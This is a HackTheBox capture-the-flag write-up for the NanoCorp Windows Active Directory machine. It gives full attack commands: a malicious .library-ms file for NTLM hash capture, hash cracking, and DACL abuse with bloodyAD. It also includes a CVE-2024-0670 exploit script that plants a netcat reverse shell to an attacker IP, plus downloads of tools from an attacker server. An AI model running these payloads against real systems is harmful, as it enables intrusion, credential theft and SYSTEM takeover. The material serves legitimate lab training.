# NanoCorp - HackTheBox Season 9 (Hard/Windows) Writeup

**Difficulty:** Hard  
**OS:** Windows  
**Points:** 40  
**Author:** weed  

---

## Overview

NanoCorp is a Hard-rated Windows Active Directory machine on HackTheBox. The attack chain involves:
1. Exploiting a ZIP file upload vulnerability to capture NTLMv2 credentials via `.library-ms` coercion
2. Cracking the hash offline to obtain `web_svc` credentials
3. Abusing Active Directory DACL misconfigurations to pivot to `monitoring_svc`
4. Exploiting CVE-2024-0670 (CheckMK agent race condition) via RunasCs to escalate to `NT AUTHORITY\SYSTEM`

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -T4 -oA nmap_initial 10.129.243.199
nmap -p- --min-rate 5000 -oA nmap_full 10.129.243.199
```

Key open ports:

| Port | Service | Notes |
|------|---------|-------|
| 80 | HTTP | hire.nanocorp.htb - Careers portal |
| 443/5986 | WinRM HTTPS | Evil-WinRM target |
| 6556 | CheckMK Agent | Unauthenticated, exposes process list |
| 88 | Kerberos | Domain Controller |
| 389/636 | LDAP/LDAPS | AD enumeration |
| 445 | SMB | SMB signing enabled |

### Virtual Host Discovery

```bash
sudo echo "10.129.243.199 nanocorp.htb hire.nanocorp.htb dc01.nanocorp.htb" >> /etc/hosts
```

The careers portal at `http://hire.nanocorp.htb` accepts ZIP file uploads only.

### CheckMK Agent Enumeration (Port 6556)

```bash
nc -nv 10.129.243.199 6556 > check_mk_dump.txt
```

Key findings from the unauthenticated data dump:

- **Version:** CheckMK 2.1.0p10 (vulnerable to CVE-2024-0670)
- **web_svc** is running `httpd.exe` (Apache/XAMPP) target for initial foothold
- **web_svc** is also running `explorer.exe` and `rdpclip.exe` indicates interactive RDP session, suggesting a human-memorable (crackable) password
- Agent directories: `C:\ProgramData\checkmk\agent\plugins`, `local`, `spool`

---

## Initial Foothold NTLMv2 Hash Capture (CVE-2025-24071)

### Vulnerability Analysis

A `.library-ms` file is an XML-based Windows Library descriptor. Its `<simpleLocation><url>` tag accepts UNC paths (`\\attacker-ip\share`). When WinRAR extracts a ZIP containing this file, the Windows shell automatically resolves the UNC path, triggering an outbound SMB authentication attempt — leaking the running user's NTLMv2 hash.

### Step 1 Start Responder

```bash
sudo responder -I tun0 -v
```

### Step 2 Craft the Malicious .library-ms File

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Malicious</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\YOUR_ATTACKER_IP\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Step 3 Package and Upload

```bash
zip exploit.zip payload.library-ms
# Upload via http://hire.nanocorp.htb file upload form
```

Responder captures the NTLMv2 hash for `NANOCORP\web_svc`.

### Step 4 Crack the Hash

```bash
hashcat -m 5600 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `web_svc : dksehdgh712!@#`

---

## Kerberos Time Skew Critical Setup

The DC's clock is ~7 hours ahead of real time. Kerberos has a 5-minute tolerance, so all Kerberos operations fail with `KRB_AP_ERR_SKEW` without correction.

> **⚠️ WARNING:** Never use `sudo ntpdate` on HTB it permanently shifts your system clock and breaks your VPN session.

### Correct Approach Use faketime

```bash
# Install
sudo apt install faketime

# Check offset
ntpdate -q 10.129.243.199

# Wrap ALL Kerberos commands with faketime
faketime -f "+7h" <command>
```

---

## Active Directory Enumeration

### /etc/krb5.conf Setup

```ini
[libdefaults]
    default_realm = NANOCORP.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true
    rdns = false

[realms]
    NANOCORP.HTB = {
        kdc = dc01.nanocorp.htb
        admin_server = dc01.nanocorp.htb
    }

[domain_realm]
    .nanocorp.htb = NANOCORP.HTB
    nanocorp.htb = NANOCORP.HTB
```

### BloodHound Collection

```bash
faketime -f "+7h" bloodhound-python -c All -d nanocorp.htb \
  -u web_svc -p 'dksehdgh712!@#' \
  -ns 10.129.243.199 -zip
```

### Attack Path Discovered

```
WEB_SVC@NANOCORP.HTB
    │
    ▼ (AddSelf)
IT_SUPPORT@NANOCORP.HTB
    │
    ▼ (ForceChangePassword)
MONITORING_SVC@NANOCORP.HTB
    │
    ▼ (MemberOf)
REMOTE MANAGEMENT USERS → WinRM Access
```

### DACL Abuse Explained

| Permission | Subject | Object | Effect |
|-----------|---------|--------|--------|
| AddSelf | web_svc | IT_SUPPORT | web_svc can add itself to the group |
| ForceChangePassword | IT_SUPPORT | monitoring_svc | Reset password without knowing current one |
| MemberOf | monitoring_svc | Remote Management Users | WinRM access on port 5986 |

---

## Lateral Movement DACL Abuse

### Step 1 AddSelf to IT_SUPPORT

```bash
faketime -f "+7h" bloodyAD --host 10.129.243.199 -d nanocorp.htb \
  -u 'web_svc' -p 'dksehdgh712!@#' \
  add groupMember IT_SUPPORT web_svc
# [+] web_svc added to IT_SUPPORT
```

### Step 2 ForceChangePassword on monitoring_svc

```bash
faketime -f "+7h" bloodyAD --host 10.129.243.199 -d nanocorp.htb \
  -u 'web_svc' -p 'dksehdgh712!@#' \
  set password monitoring_svc 'Anonym0use!!'
# [+] Password changed successfully!
```

> **⚠️ Note on Shared Machines:** Other players can reset the password. The minimum password age policy blocks re-changes for 3 days. Work fast — change password → get TGT → connect in one shot.

### Step 3 Get TGT and WinRM Shell

`monitoring_svc` is in the **Protected Users** group NTLM authentication is completely blocked. Kerberos ticket required.

```bash
# Get TGT
faketime -f "+7h" getTGT.py nanocorp.htb/monitoring_svc:'Anonym0use!!' \
  -dc-ip 10.129.243.199
export KRB5CCNAME=monitoring_svc.ccache

# Connect via Kerberos (must use FQDN, not IP)
faketime -f "+7h" evil-winrm -i dc01.nanocorp.htb \
  -r NANOCORP.HTB -K monitoring_svc.ccache -S
```

### Capture user.txt

```powershell
type C:\Users\monitoring_svc\Desktop\user.txt
```

---

## Privilege Escalation CVE-2024-0670 (CheckMK Race Condition)

### Vulnerability Analysis

The CheckMK agent (v2.1.0p10) runs as `NT AUTHORITY\SYSTEM`. During MSI self-repair, it creates temporary batch scripts in `C:\Windows\Temp` with predictable names:

```
cmk_all_<PID>_<CTR>.cmd
```

**The exploit chain:**

1. **Predictable names** - attacker pre-creates files for all possible PIDs
2. **World-writable directory** - `C:\Windows\Temp` allows any user to create files
3. **Read-only trap** - set pre-created files as read-only
4. **Silent failure** - agent fails to overwrite read-only file but doesn't check return value
5. **Execution** - agent executes attacker's payload as SYSTEM

### The Pivot Problem

`monitoring_svc` cannot trigger MSI repair gets error `1601 (ERROR_INSTALL_SERVICE_FAILURE)`. `web_svc` can trigger it, but has no persistent WinRM shell due to its account configuration.

**Solution: RunasCs** execute commands as `web_svc` from within the `monitoring_svc` shell.

### Step 1 Create exploit.ps1

```powershell
$LHOST = "YOUR_ATTACKER_IP"
$LPORT = "9001"
$NcPath = "C:\Windows\Temp\nc.exe"
$Payload = "@echo off`r`n" + $NcPath + " -e cmd.exe " + $LHOST + " " + $LPORT
$msi = "C:\Windows\Installer\1e6f2.msi"

Write-Host "[*] MSI: $msi"
Write-Host "[*] Seeding files 1000-15000..."

foreach ($ctr in @(0,1)) {
    foreach ($num in 1000..15000) {
        $f = "C:\Windows\Temp\cmk_all_${num}_${ctr}.cmd"
        try {
            [IO.File]::WriteAllText($f, $Payload, [Text.Encoding]::ASCII)
            (Get-Item $f).IsReadOnly = $true
        } catch {}
    }
}

Write-Host "[*] Done seeding. Triggering MSI repair..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn" -Wait
Write-Host "[*] Done. Check listener."
```

### Step 2 Prepare Tools on Attacker Machine

```bash
# Download RunasCs
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip

# Start HTTP server
cd ~/Documents/HTB/nanocorp
python3 -m http.server 8000

# Start listener
rlwrap nc -lnvp 9001
```

### Step 3 Download Tools in monitoring_svc Shell

```powershell
cd C:\Windows\Temp
wget http://ATTACKER_IP:8000/nc.exe -UseBasicParsing -OutFile "nc.exe"
wget http://ATTACKER_IP:8000/RunasCs.exe -UseBasicParsing -OutFile "RunasCs.exe"
wget http://ATTACKER_IP:8000/exploit.ps1 -UseBasicParsing -OutFile "bad.ps1"
```

### Step 4 Execute as web_svc via RunasCs

```powershell
.\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"
```

The script seeds ~30,000 read-only batch files, then triggers the MSI repair. The CheckMK agent spawns a new process, picks up the attacker's batch file, and executes it as SYSTEM.

### Step 5 Capture root.txt

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## Key Lessons & Notes

### Protected Users Group
If an account is in `Protected Users`, NTLM is completely disabled. Symptoms: `WinRMAuthorizationError` even with correct password. Solution: always use Kerberos tickets with `faketime`.

### Kerberos Auth Requirements
- Always use FQDN (`dc01.nanocorp.htb`), never IP SPNs are registered by hostname
- FQDN must resolve in `/etc/hosts`
- `KRB5CCNAME` env var must match the exact ccache filename
- Time skew must be corrected with `faketime -f "+Xh"`

### Shared Machine Challenges
- Other players reset `monitoring_svc` password constantly
- Minimum password age policy blocks re-changes for 3 days after someone else changed it
- Solution: time your attack, change → get TGT → connect immediately in a single script

### RunasCs The Key Tool
When you have credentials for a user but can't get a shell (WinRM auth fails, NTLM blocked, etc.), RunasCs lets you execute commands under that user's token from any existing shell. Essential for this box.

### MSI Path
The CheckMK MSI is always at `C:\Windows\Installer\1e6f2.msi` on this box. The registry key `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties` can only be read by privileged accounts.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Responder | Capture NTLMv2 hashes |
| hashcat | Offline password cracking |
| bloodyAD | LDAP DACL abuse (AddSelf, ForceChangePassword) |
| impacket (getTGT.py) | Kerberos TGT acquisition |
| evil-winrm | WinRM shell via Kerberos |
| BloodHound + bloodhound-python | AD attack path enumeration |
| RunasCs | Execute commands as different user |
| netcat (nc.exe) | Reverse shell payload |
| faketime | Kerberos clock skew correction |
| PetitPotam | NTLM coercion (alternate path) |

---

## Attack Chain Summary

```
[File Upload - hire.nanocorp.htb]
         │
         ▼ (.library-ms in ZIP → WinRAR UNC coercion)
[Responder captures NTLMv2 hash]
         │
         ▼ (hashcat rockyou.txt)
[web_svc : dksehdgh712!@#]
         │
         ▼ (bloodyAD AddSelf + ForceChangePassword)
[monitoring_svc : Anonym0use!!]
         │
         ▼ (Kerberos TGT + evil-winrm -S)
[WinRM Shell as monitoring_svc] → user.txt
         │
         ▼ (RunasCs as web_svc → exploit.ps1)
[CVE-2024-0670 CheckMK Race Condition]
         │
         ▼
[NT AUTHORITY\SYSTEM] → root.txt
```
